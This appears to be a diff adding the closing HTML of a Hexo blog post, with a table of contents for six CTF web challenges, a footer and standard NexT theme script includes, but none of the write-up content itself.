+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web1-where-are-you-from-level1"><span class="nav-number">1.</span> <span class="nav-text">web1-where are you from level1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web2-include-me"><span class="nav-number">2.</span> <span class="nav-text">web2-include me</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web3-where-are-you-from-level2"><span class="nav-number">3.</span> <span class="nav-text">web3-where are you from level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web4-onepiece"><span class="nav-number">4.</span> <span class="nav-text">web4-onepiece</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web5-yunpan"><span class="nav-number">5.</span> <span class="nav-text">web5-yunpan</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web6-gallery"><span class="nav-number">6.</span> <span class="nav-text">web6-gallery</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">句末</span>
+
+  
+</div>
+-->
+<div class="powered-by">
+<i class="fa fa-user-md"></i>
+
+
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
